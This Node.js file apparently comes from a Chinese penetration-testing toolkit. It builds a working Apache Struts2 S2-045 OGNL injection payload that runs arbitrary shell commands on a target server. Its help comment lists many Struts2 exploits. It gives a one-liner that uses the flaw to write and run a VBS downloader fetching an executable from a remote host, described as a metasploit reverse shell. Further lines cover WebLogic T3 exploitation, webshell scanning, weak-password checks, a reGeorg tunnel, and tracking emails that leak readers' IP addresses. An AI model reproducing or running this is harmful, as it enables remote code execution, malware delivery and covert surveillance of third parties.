// 数据拷贝
function copyO2O(oS,oD)
{
	for(var k in oS)
	{
		oD[k] = oS[k];
	}
}
// 定义全局变量
copyO2O({szMyName:'M.T.X._2017-06-08 1.0',
	program:require('commander'),
	request:require('request'),
	urlObj:require('url'),
	async:require('async'),
	child_process:require("child_process"),
	net:require('net'),
	crypto:require('crypto'),
	path:require("path"),
	fs:require('fs'),
	g_szUrl:"",bReDo:false, szLstLocation:"",
	g_oRst:{},
	timeout:5000,
	g_nPool:100,
	iconv:require("iconv-lite"),
	bRunHost:false,
	g_szUa:"Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043409 Safari/537.36 V1_AND_SQ_7.1.8_718_YYB_D PA QQ/7.1.8.3240 NetType/4G WebP/0.3.0 Pixel/540",
	g_szCmd:"echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
	g_szCmdW:"echo whoami:&& whoami && echo pwd:&& echo %cd% && echo cmdend", // && dir
	aHS:"X-Content-Type-Options,content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
	fnError:function(e)
	{
		console.log(String(e));
	},
	fnHelp:function(){
/*
tomcat Put test
Struts2_001
Struts2_005
Struts2_007
Struts2_008
Struts2_009
Struts2_012
Struts2_013
Struts2_015
Struts2_016
Struts2_019
Struts2_020
Struts2_029
Struts2_032
Struts2_033
Struts2_037
Struts2_DevMode
Struts2_045
Struts2_046
Struts2_048
Struts2_053
elasticsearch
伪造host等检测

# 利用struts2 045漏洞，下载metasploit反弹程序并执行，以下在一行中
node checkUrl.js -u http://192.168.10.115:8080/ --struts2 045 --cmd 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

node checkUrl.js -u http://192.168.10.15:8080/ --struts2 045 --cmd 'tasklist -svc'

# 批量开放T3检测，txt中可以放url
node checkUrl.js --t3 checkT3hostsUrlsFile.txt
# 常见webshell和url扫描
node checkUrl.js -s ./urls/webshell.txt -m ./urls/ta3menu.txt -u http://192.168.10.115:8080/

# T3协议漏洞的检测和利用
java -jar jfxl.jar 192.168.19.30:7001

# 指定一个网段的扫描
java -jar jfxl.jar 192.168.19.30-255:7001

# 目录、文件中文本文件字符集批量转换为utf-8
# 后渗透后得到很多win的数据txt文件，字符集gbk批量转换为utf8
node gbk2utf8.js fileOrDirName

# 多种解码
node decode.js base64等格式字符串

# eml 文件批量读取、转换
node emlToFileToos.js /Volumes/MyWork/eml /Volumes/MyWork/eml_data

# 手工XSS、渗透时需要的一些常用编码、解码
open strDecodeEncode.html

# 获取图片中的元数据（经纬度、创建时间）
node getFileMetadata.js yourJpgFile.jpg

# jndi内网无密码访问漏洞测试
java -jar ./JNDI_TEST/JNDITEST.jar -p 7101 -u 192.168.10.216 -j QIMS_TEST -d mysql

# weblogic中间件T3漏洞扫描
编辑ip.txt
python ./weblogic.py

# 二维码解码
node QrCodeDecode.js Haiios.jpg

# svn 弱密码检测 2017-01-22 M.T.X
node checkSvn.js http://18.12.88.10:8090/svn/ userName Pswd

# 信箱默认密码测试
node testPop3.js 12.171.20.20 110 mytels.txt

# http代理，有时候需要一个二级代理，来获得、修改一些数据
# 动态代理，每次自动随机使用代理
node proxy/ProxyServer.js
or
pm2 start ProxyServer.js -i max

# 更新代理 autoProxy.txt

node checkProxy.js
cat autoProxy.txt|sort|uniq >ok.txt
mv ok.txt autoProxy.txt
cat autoProxy.txt|wc -l

# 提取目录、文件，包含二进制文件中 ip信息
# 被入侵后，查看整个目录中所有ip信息，包含bin，可自行文件中的ip信息
node getIps.js fileOrDir

# 发送无跟踪邮件
sendmail.js  内容自行修改
邮件跟踪功能，当对方阅读后，能够从http://23.105.209.65/获取到阅读邮件的ip、user-agent等信息
proxychains4 -f ~/pc.conf  node sendmail.js 

# 某种js压缩后的解码、压缩编码, win下运行
压缩.hta

# 连接http隧道
python reGeorgSocksProxy.py -l 127.0.0.1 -p 8080 -u http://11.22.10.10:8070/ip/x.jsp

*/
},fnMyHelp:function()
{
	console.log(fnHelp.toString().split(/\n/).slice(2, -2).join('\n'));
},
fnOptHeader:function(o)
{
	var k = {followAllRedirects:false,followRedirect:false,"timeout":timeout,pool: {maxSockets: g_nPool}};
	for(var i  in k)
	{
		o[i] = k[i];
	}
	return o;
},
fnMkPayload:function(w,l)
{
	w || (w = g_szCmdW);
	l || (l = g_szCmd);
	copyO2O({g_postData:"%{(#nike='multipart/form-data')"
		// s-045不允许下面的代码
		// + ".(#_memberAccess['allowStaticMethodAccess']=true)"
		// + ".(#_memberAccess['acceptProperties']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedClasses']=true)"
		+ ".(#rplc=true)"
		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
		+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
		+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
		+ ".(#ognlUtil.getExcludedPackageNames().clear())"
		+ ".(#ognlUtil.getExcludedClasses().clear())"
		+ ".(#context.setMemberAccess(#dm))))"
		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + w + "'}:{'/bin/bash','-c','" + l + "'}))"
		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
		// response.addHeader
		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
		// + ".(#response.addHeader('struts2','_struts2_'))"
		+ ".(#ros=(#response.getOutputStream()))"

	    // 我添加的当前位置行加上后，会无法输出
	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
		// + ".(@org.apache.commons.io.IOUtils@copy(new java.io.InputStreamReader(#process.getInputStream(),#iswin?'gbk':'UTF-8'),#ros))"
		 + ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
		+ ".(#ros.flush()).(#ros.close())}"},global);
}
},global);

// 加载所有的插件动态库
// 各种插件库分开编写，便于维护
// eval(fs.readFileSync(a[k])+'');
process.title = '巅狼团队_M.T.X.V 2.0'
process.stdin.setEncoding('utf8');
process.env.NODE_ENV = "production";
process.on('uncaughtException', fnError);
process.on('unhandledRejection', fnError);

/*
+function(){
	for(var k in global)
	{
		var oT = global[k], t = typeof oT;
		if("object" !=  t && "function" != t)
		eval(k + " = " + JSON.stringify(oT));
	}
}();
console.log(szMyName);
*/
